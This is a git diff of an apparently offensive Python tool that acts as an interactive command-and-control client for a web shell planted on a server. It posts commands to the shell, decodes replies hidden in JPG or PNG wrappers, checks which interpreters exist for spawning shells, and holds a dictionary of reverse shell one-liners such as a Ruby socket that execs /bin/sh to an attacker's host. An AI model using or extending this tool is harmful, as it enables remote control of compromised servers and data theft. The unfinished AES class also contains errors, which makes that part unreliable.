@@ -1,16 +1,21 @@
 #!/usr/bin/env python3
 #Reworked:
-#  Converted to object oreinted
-#  Added option for shell in a wrapper
-#  Reduced tools query to one webrequest
+#  Added wrapper detection
+#  Interactive client
 #Needed:
 #  Encryption
+#  Reverse Shell Handling
 #----------------------------------------------------------------------------
 #Imports
 from argparse import ArgumentParser
-from urllib import parse
-from base64 import b64encode
-from re import search
+from binascii import hexlify,unhexlify
+from re import search,sub
+from os import path
+from json import loads,dumps
+from base64 import b64encode,b64decode
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad,unpad
+from Crypto.Random import get_random_bytes
 
 def installer(program):
   try:
@@ -25,6 +30,8 @@ try:
   from requests import request as http
 except:
   installer("requests")
+
+
 try:
   from termcolor import colored as color
 except:
@@ -50,6 +57,14 @@ revshells = {
   'ruby': 'ruby -rsocket -e \'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i")\''
  }
 
+helpmenu = """
+  revshell tool ip port
+  {command}
+  exit
+  quit
+  help
+ """
+
 url = args.url
 if args.wrapper and args.wrapper not in filetypes.keys():
   print(f"[!] Wrapper not in: {filetypes.keys()}")
@@ -63,18 +78,64 @@ else: wrapper = args.wrapper
 class cnc(object):
   def __init__(self, url, wrapper, crypto):
     self.url = url
-    if wrapper: self.wrapper = wrapper
-    #self.tools = self.enumtools()
+    self.wrapper = wrapper
+    self.tools = self.enumtools()
   def webrequest(self, cmd):
-    data = {"content": parse.quote(cmd)}
-    return http("POST", self.url, data=data)
+    data = {"content": cmd}
+    r = http("POST", self.url, data=data)
+    if r.status_code == 404:
+      print("[!] No shell at URI")
+      exit()
+    if r.content.startswith(unhexlify(filetypes['jpg']['b'])): self.wrapper = 'jpg'
+    elif r.content.startswith(unhexlify(filetypes['png']['b'])): self.wrapper = 'png'
+    if self.wrapper: content = self.unwrap(r.content)
+    else: content = r.content.decode()
+    return content
+  def unwrap(self, wrapped):
+    h = hexlify(wrapped)
+    beginlen = len(filetypes[self.wrapper]['b'])
+    endlen = (len(h)-len(filetypes[self.wrapper]['e']))
+    mid = h[beginlen:endlen]
+    return unhexlify(mid).decode()
   def enumtools(self):
-    cmd = f"which {revshells.keys()}"
-    self.webrequest(cmd)
+    cmd = f"which {' '.join(str(v) for v in revshells.keys())}"
+    resp = self.webrequest(cmd)
     return [v for v in revshells.keys() if search(v, resp)]
+
+class aes(object):
+  def __init__(self, key):
+    if key: self.key = key
+    else: key = get_random_bytes(16)
+    self.ciphere = AES.new(key, AES.MODE_CBC)
+    self.cipherd = AES.new(key, AES.MODE_CBC, ciphere.iv)
+
+def get_cmd(cmd):
+  cmddict = {'cmd': cmd}
+  if cmd in ['quit', 'exit']: exit()
+  elif cmd == "help":
+    print(helpmenu)
+  elif not cmd: return cmddict
+  elif cmd == "tools": print('\n'.join(color(f"  {tool}", 'green') for tool in tools))
+  elif cmd.startswith("revshell") and len(cmd.split()) != 4:
+    print("[!] Revshell command not recognized")
+  elif cmd.startswith("revshell") and cmd.split()[1] not in tools:
+      print(f"[!] {cmd.split()[1]} not in tools list")
+      print('\n'.join(color(f"  {tool}", 'green') for tool in tools))
+  elif cmd.startswith("revshell") and cmd.split()[1] in tools:
+    print("not implemented yet.")
+    #return {'command': revshells[cmd.split()[1]], 'cmd': cmd}
+  else: cmddict['command'] =  cmd
+  return cmddict
 
 #----------------------------------------------------------------------------
 #Runcall
 run = cnc(url, wrapper, '')
-print(run.webrequest("id").raw)
+tools = run.tools
+while True:
+  cmd = input(color(" $ ","blue"))
+  cmd = get_cmd(cmd)
+  if 'command' in cmd.keys():
+    result = run.webrequest(cmd['command'])
+    print(result)
+  else: pass
 
